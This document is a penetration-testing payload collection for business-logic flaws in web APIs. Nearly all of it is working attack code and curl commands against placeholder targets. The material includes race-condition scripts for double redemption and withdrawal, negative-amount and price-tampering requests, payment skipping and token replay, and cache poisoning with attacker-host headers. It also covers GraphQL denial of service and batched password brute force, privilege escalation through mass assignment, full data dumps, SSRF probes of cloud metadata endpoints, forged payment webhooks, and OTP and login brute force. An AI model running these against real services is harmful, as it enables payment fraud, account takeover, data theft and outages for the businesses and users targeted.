# Logic Vulnerability Attack Payloads

## Race Condition -- Concurrent HTTP Requests

### Python threading -- configurable race PoC
```python
#!/usr/bin/env python3
"""
Race condition PoC: send N concurrent identical requests to exploit a non-atomic operation.
Usage: python3 race_condition.py --url https://target.com/api/redeem --token TOKEN --count 50
"""
import threading, requests, argparse, time, json
from collections import Counter

parser = argparse.ArgumentParser()
parser.add_argument('--url', required=True)
parser.add_argument('--token', required=True)
parser.add_argument('--count', type=int, default=50, help='Number of concurrent requests')
parser.add_argument('--body', default='{}', help='JSON request body')
args = parser.parse_args()

results = []
lock = threading.Lock()

def send_request():
    try:
        r = requests.post(
            args.url,
            json=json.loads(args.body) if isinstance(args.body, str) else args.body,
            headers={
                'Authorization': f'Bearer {args.token}',
                'Content-Type': 'application/json',
            },
            timeout=10
        )
        with lock:
            results.append(r.status_code)
    except Exception as e:
        with lock:
            results.append(f"ERROR:{e}")

threads = [threading.Thread(target=send_request) for _ in range(args.count)]

start = time.perf_counter()
for t in threads:
    t.start()
for t in threads:
    t.join()
elapsed = time.perf_counter() - start

print(f"\nResults ({args.count} concurrent requests, {elapsed:.2f}s):")
counts = Counter(results)
for status, count in sorted(counts.items()):
    print(f"  HTTP {status}: {count} responses")
# If 200: >1 -> RACE CONDITION confirmed
```

### Python asyncio -- high-speed concurrent requests
```python
import asyncio
import aiohttp

async def withdraw(session, url, cookie, amount):
    async with session.post(url, json={"amount": amount},
                            headers={"Cookie": cookie}) as r:
        data = await r.json()
        return r.status, data

async def race_condition_test():
    url = "https://target.com/api/withdraw"
    cookie = "session=YOUR_AUTH_COOKIE"
    amount = 100

    async with aiohttp.ClientSession() as session:
        tasks = [withdraw(session, url, cookie, amount) for _ in range(50)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

    ok_count = sum(1 for status, data in results
                   if isinstance(data, dict) and data.get('status') == 'ok')
    print(f"Race result: {ok_count}/50 succeeded (expected: 1)")

asyncio.run(race_condition_test())
```

### HTTP/2 single-packet attack (most precise timing)
```python
#!/usr/bin/env python3
"""
HTTP/2 race condition using single-packet technique.
All requests arrive in the same TCP packet -- server processes simultaneously.
Requires: pip install httpx[http2]
"""
import httpx, asyncio

async def race_condition_h2(url: str, token: str, num_requests: int = 20):
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json",
    }
    body = '{"action": "redeem_voucher", "code": "PROMO50"}'

    async with httpx.AsyncClient(http2=True) as client:
        await client.get(url.rsplit('/', 1)[0], headers=headers)  # warm connection
        tasks = [
            client.post(url, content=body, headers=headers)
            for _ in range(num_requests)
        ]
        responses = await asyncio.gather(*tasks, return_exceptions=True)

    successes = [r for r in responses if isinstance(r, httpx.Response) and r.status_code == 200]
    print(f"Successful responses: {len(successes)}/{num_requests}")
    if len(successes) > 1:
        print("[RACE CONDITION] Multiple concurrent requests succeeded!")

asyncio.run(race_condition_h2("https://TARGET.COM/api/redeem", "TOKEN"))
```

### Burp Suite Turbo Intruder -- last-byte sync
```python
# Paste into Turbo Intruder extension script editor

def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=50,
        requestsPerConnection=1,
        pipeline=False,
        engine=Engine.BURP2
    )
    for i in range(50):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    if req.status != 400:
        table.add(req)
```

---

## Negative Quantity / Amount

### Direct API call with negative value
```bash
# Add -1 of a $100 product -> cart total becomes -$100
curl -X POST https://target.com/api/cart \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_COOKIE" \
  -d '{"product_id": 42, "quantity": -1}'

# Checkout -- observe total amount charged
curl -X POST https://target.com/api/checkout \
  -H "Cookie: session=YOUR_COOKIE" -d '{}'
```

### Transfer with negative amount
```bash
# Transfer -1000 -> sender gains 1000, recipient loses 1000
curl -X POST https://target.com/api/transfer \
  -H "Content-Type: application/json" \
  -H "Cookie: session=ATTACKER_COOKIE" \
  -d '{"to_user_id": 999, "amount": -1000}'
```

### Python PoC -- negative quantity test
```python
import requests

s = requests.Session()
s.cookies.set('session', 'YOUR_COOKIE')

s.delete('https://target.com/api/cart')
r = s.post('https://target.com/api/cart',
    json={"product_id": 1, "quantity": -5})
print(f"Add to cart: {r.status_code} {r.json()}")

s.post('https://target.com/api/cart',
    json={"product_id": 2, "quantity": 1})

r = s.post('https://target.com/api/checkout')
print(f"Checkout: {r.json()}")
```

---

## Workflow Bypass -- Skip Payment Step

### Map the API workflow and skip steps
```bash
# Step 1: Create order
ORDER=$(curl -s -X POST https://target.com/api/orders \
  -H "Cookie: session=COOKIE" \
  -d '{"items": [{"product_id": 1, "qty": 1}]}' | jq -r '.order_id')

# Step 2: SKIP payment, go directly to fulfillment
curl -X POST "https://target.com/api/orders/$ORDER/fulfill" \
  -H "Cookie: session=COOKIE"

# Step 3: Or skip to "paid" status directly
curl -X PATCH "https://target.com/api/orders/$ORDER" \
  -H "Cookie: session=COOKIE" \
  -d '{"status": "paid"}'
```

---

## Price Manipulation

### Burp Suite -- intercept checkout POST
```
# Original request body:
{"items": [{"product_id": 1, "quantity": 1, "price": 99.99}], "total": 99.99}

# Modified request body:
{"items": [{"product_id": 1, "quantity": 1, "price": 0.01}], "total": 0.01}
```

### curl -- direct price manipulation
```bash
curl -X POST https://target.com/api/checkout \
  -H "Content-Type: application/json" \
  -H "Cookie: session=COOKIE" \
  -d '{"items": [{"product_id": 1, "quantity": 1, "price": 0.01}], "total": 0.01}'
```

---

## Coupon Abuse -- Concurrent Redemption Race

```python
import threading
import requests

BASE_URL = "https://target.com"
COUPON_CODE = "SAVE50"
N = 30

def redeem(session_cookie, results, idx):
    r = requests.post(f"{BASE_URL}/api/coupons/redeem",
        json={"code": COUPON_CODE},
        headers={"Cookie": f"session={session_cookie}"},
        timeout=5)
    results[idx] = {'status': r.status_code, 'body': r.json()}

results = [None] * N
threads = [threading.Thread(target=redeem, args=("YOUR_COOKIE", results, i))
           for i in range(N)]

for t in threads:
    t.start()
for t in threads:
    t.join()

successes = [r for r in results if r['status'] == 200]
print(f"Coupon redeemed {len(successes)} times (expected: 1)")
```

### Coupon enumeration (brute-force coupon codes)
```python
import requests

BASE_URL = "https://target.com"

def try_coupon(code):
    r = requests.post(f'{BASE_URL}/api/coupons/check', json={'code': code})
    if r.status_code == 200 and r.json().get('valid'):
        print(f"[FOUND] Valid coupon: {code} -- {r.json()}")
        return True
    return False

prefixes = ['SAVE', 'DISC', 'OFF', 'PROMO', 'VIP', 'FREE', 'DEAL']
for prefix in prefixes:
    for num in range(5, 100, 5):
        try_coupon(f"{prefix}{num}")

for i in range(10000):
    try_coupon(str(i).zfill(6))
```

---

## Replay Attack -- Reusing Payment Tokens

```python
import requests

s = requests.Session()
s.cookies.set('session', 'ATTACKER_COOKIE')

# Step 1: Legitimate payment, capture the payment reference
r = s.post('https://target.com/api/orders/1/pay',
    json={'payment_token': 'tok_visa_test'})
payment_ref = r.json().get('payment_reference')

# Step 2: Replay for a different order
r = s.post('https://target.com/api/orders/2/pay',
    json={'payment_reference': payment_ref})
print(f"Replay: {r.status_code} -- {r.json()}")
```

---

## Idempotency Key Abuse

```bash
# Reuse same idempotency key with different amounts
curl -X POST https://target.com/api/payments \
  -H "Idempotency-Key: fixed-key-12345" \
  -H "Cookie: session=COOKIE" \
  -d '{"amount": 100}'

# Reuse same key for different user (is key scoped to user?)
curl -X POST https://target.com/api/payments \
  -H "Idempotency-Key: fixed-key-12345" \
  -H "Cookie: session=OTHER_USER_COOKIE" \
  -d '{"amount": 1}'
```

---

## Cache Poisoning Headers

### X-Forwarded-Host poisoning
```bash
curl -s "https://TARGET.COM/api/reset-password" \
    -H "X-Forwarded-Host: attacker.com" \
    -H "Accept: text/html" \
    -w "\nX-Cache: %header{x-cache}\n"
```

### Host header injection for cache poisoning
```bash
# Step 1: Send poison request
curl -s "https://TARGET.COM/page" \
    -H "Host: TARGET.COM" \
    -H "X-Forwarded-Host: evil.com" \
    -H "X-Host: evil.com" \
    -H "X-Forwarded-Server: evil.com" \
    > poison_response.html

grep "evil.com" poison_response.html

# Step 2: Verify poison is cached
curl -s "https://TARGET.COM/page" | grep "evil.com"
```

### Web cache deception -- steal private data
```bash
# Deception URLs to try:
DECEPTION_PATHS=(
    "/profile/nonexistent.css"
    "/account/x.js"
    "/settings/y.png"
    "/dashboard/..%2Fstyle.css"
    "/api/users/me%3F.css"
)

for path in "${DECEPTION_PATHS[@]}"; do
    echo "Testing: $path"
    curl -s "https://TARGET.COM$path" \
        -H "Cookie: session=VICTIM_SESSION" \
        -w "\nX-Cache-Status: %header{x-cache-status}\n"
done
```

---

## Stale Auth Test

```bash
# Step 1: Get token
TOKEN=$(curl -s -X POST "https://TARGET.COM/api/auth/login" \
    -H "Content-Type: application/json" \
    -d '{"email":"user@test.com","password":"password"}' \
    | python3 -c "import json,sys; print(json.load(sys.stdin)['token'])")

# Step 2: Verify token works
curl "https://TARGET.COM/api/users/me" -H "Authorization: Bearer $TOKEN"

# Step 3: Revoke token (logout)
curl -X POST "https://TARGET.COM/api/auth/logout" -H "Authorization: Bearer $TOKEN"

# Step 4: Use revoked token -- check if still valid
for i in $(seq 1 60); do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://TARGET.COM/api/users/me" -H "Authorization: Bearer $TOKEN")
    echo "$(date): $STATUS"
    [ "$STATUS" = "401" ] && echo "Token invalidated at $((i * 5))s" && break
    sleep 5
done
```

---

## Distributed Lock TTL Race

```python
#!/usr/bin/env python3
"""Test if distributed lock TTL is shorter than operation duration."""
import requests, threading, time

TARGET = "https://TARGET.COM/api/payment/process"
TOKEN = "USER_TOKEN"
PAYMENT_BODY = {"amount": 100, "currency": "USD", "method": "credit_card"}

successes = []

def process_payment(attempt_num):
    r = requests.post(TARGET,
        json=PAYMENT_BODY,
        headers={"Authorization": f"Bearer {TOKEN}"},
        timeout=15)
    if r.status_code == 200:
        successes.append((attempt_num, r.json()))
        print(f"[{attempt_num}] SUCCESS: {r.json()}")
    else:
        print(f"[{attempt_num}] Blocked: HTTP {r.status_code}")

t1 = threading.Thread(target=process_payment, args=(1,))
t1.start()

# Wait for suspected TTL, then send another
time.sleep(1.1)
t2 = threading.Thread(target=process_payment, args=(2,))
t2.start()

t1.join()
t2.join()

if len(successes) > 1:
    print(f"\n[RACE] {len(successes)} payments succeeded -- lock TTL too short!")
```

---

## GraphQL Depth Attack (DoS)

### Deeply nested query
```graphql
{
  user(id: 1) {
    posts {
      author {
        posts {
          author {
            posts {
              author {
                posts {
                  author {
                    posts {
                      author {
                        posts {
                          author {
                            posts {
                              id
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

### Send depth attack via curl
```bash
python3 -c "
depth = 15
query = '{ user(id: 1) { '
query += 'posts { author { ' * depth
query += 'id username '
query += '} } ' * depth
query += '} }'
import json
print(json.dumps({'query': query}))
" | curl -s -X POST "https://TARGET.COM/graphql" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer TOKEN" \
    --data-binary @- \
    -w "\nTime: %{time_total}s\n"
```

## GraphQL Batching Abuse (Rate Limit Bypass)

### Single request containing hundreds of login attempts
```python
#!/usr/bin/env python3
"""GraphQL batching abuse: bypass per-request rate limiting via array of queries."""
import requests

TARGET = "https://TARGET.COM/graphql"
TOKEN = "USER_TOKEN"

passwords = open('/usr/share/wordlists/rockyou.txt').read().splitlines()[:250]

batch = []
for password in passwords:
    batch.append({
        "query": """
            mutation Login($username: String!, $password: String!) {
                login(username: $username, password: $password) {
                    token
                    user { id email isAdmin }
                }
            }
        """,
        "variables": {"username": "admin", "password": password}
    })

resp = requests.post(TARGET,
    json=batch,
    headers={"Content-Type": "application/json", "Authorization": f"Bearer {TOKEN}"}
)

for i, result in enumerate(resp.json()):
    if result.get('data', {}).get('login', {}).get('token'):
        print(f"[SUCCESS] Password: {passwords[i]}")
```

---

## REST Mass Assignment

### Escalate privileges via profile update
```bash
# Attempt 1: top-level admin fields
curl -X PATCH "https://TARGET.COM/api/users/me" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer USER_TOKEN" \
    -d '{
        "display_name": "Test User",
        "is_admin": true,
        "is_staff": true,
        "is_superuser": true,
        "role": "admin",
        "permissions": ["*"],
        "group": "administrators"
    }'

# Attempt 2: nested user object
curl -X PATCH "https://TARGET.COM/api/profile" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer USER_TOKEN" \
    -d '{"profile": {"user": {"is_admin": true, "role": "ADMIN"}}}'

# Verify escalation
curl "https://TARGET.COM/api/users/me" \
    -H "Authorization: Bearer USER_TOKEN" \
    | python3 -m json.tool | grep -iE "admin|role|staff|super|permission"
```

---

## Pagination Abuse

### Dump entire database via high page_size
```bash
for SIZE in 100 1000 10000 100000 1000000; do
    echo -n "page_size=$SIZE: "
    RESP=$(curl -s "https://TARGET.COM/api/documents?page_size=$SIZE" \
        -H "Authorization: Bearer TOKEN")
    COUNT=$(echo "$RESP" | python3 -c "import json,sys; d=json.load(sys.stdin); print(len(d.get('results', d if isinstance(d,list) else [])))" 2>/dev/null)
    echo "$COUNT records returned"
done
```

### Offset-based full dump
```python
#!/usr/bin/env python3
"""Dump all records by iterating offsets."""
import requests, json

BASE_URL = "https://TARGET.COM/api/documents"
TOKEN = "USER_TOKEN"
headers = {"Authorization": f"Bearer {TOKEN}"}

all_records = []
offset = 0
page_size = 100

while True:
    r = requests.get(BASE_URL, params={"limit": page_size, "offset": offset}, headers=headers)
    data = r.json()
    results = data.get("results", data if isinstance(data, list) else [])
    if not results:
        break
    all_records.extend(results)
    offset += len(results)
    print(f"Fetched {len(all_records)} records so far...")
    if len(results) < page_size:
        break

print(f"Total records dumped: {len(all_records)}")
with open("dumped_records.json", "w") as f:
    json.dump(all_records, f, indent=2)
```

---

## Webhook SSRF Payloads

### Internal IP probing via webhook
```bash
INTERNAL_TARGETS=(
    "http://127.0.0.1:8080/admin"
    "http://10.0.0.1/admin"
    "http://192.168.1.1/admin"
    "http://localhost:5432"
    "http://localhost:6379"
    "http://localhost:27017"
    "http://169.254.169.254/latest/meta-data/"
    "http://metadata.google.internal/computeMetadata/v1/"
    "http://169.254.169.254/metadata/instance"
)

for target in "${INTERNAL_TARGETS[@]}"; do
    echo "Testing: $target"
    curl -s -X POST "https://TARGET.COM/api/webhooks" \
        -H "Authorization: Bearer USER_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"url\": \"$target\", \"events\": [\"order.created\"]}"
done
```

## Webhook Replay (No Signature Verification)

```bash
# Replay captured webhook payload with modified data
curl -X POST "https://TARGET.COM/webhooks/payment" \
    -H "Content-Type: application/json" \
    -d '{
        "event": "payment.completed",
        "amount": 0.01,
        "status": "paid",
        "order_id": 99999,
        "customer_id": "attacker@evil.com"
    }'
```

---

## OTP/2FA Brute Force (Missing Rate Limit)

```python
#!/usr/bin/env python3
"""Brute force 6-digit OTP with no rate limiting."""
import requests

TARGET = "https://TARGET.COM/api/auth/verify-otp"
SESSION_TOKEN = "VALID_SESSION_AFTER_STEP1_AUTH"
headers = {"Authorization": f"Bearer {SESSION_TOKEN}", "Content-Type": "application/json"}

for code in range(1000000):
    otp = f"{code:06d}"
    r = requests.post(TARGET, json={"otp": otp}, headers=headers)
    if r.status_code == 200:
        print(f"[SUCCESS] OTP: {otp}")
        print(f"Response: {r.json()}")
        break
    if r.status_code == 429:
        print(f"[RATE LIMITED] at attempt {code}")
        break
    if code % 1000 == 0:
        print(f"Tried {code} codes...")
```

---

## Brute Force Login (Missing Rate Limit)

```python
import requests, time

BASE_URL = "https://target.com"
TARGET_EMAIL = "admin@target.com"

passwords = [
    "password", "Password1", "password123", "Password123!",
    "admin", "admin123", "Admin123!", "letmein", "qwerty",
    "12345678", "iloveyou", "abc123", "monkey", "dragon",
    "master", "superman", "batman", "trustno1", "welcome"
]

for pwd in passwords:
    r = requests.post(f'{BASE_URL}/api/login',
        json={'email': TARGET_EMAIL, 'password': pwd})
    if r.status_code == 200:
        print(f"[SUCCESS] Password found: {pwd}")
        break
    elif r.status_code == 429:
        print(f"[RATE LIMITED] after trying: {pwd}")
        break
    elif r.status_code == 401:
        print(f"[FAIL] {pwd}")
    time.sleep(0.1)
```
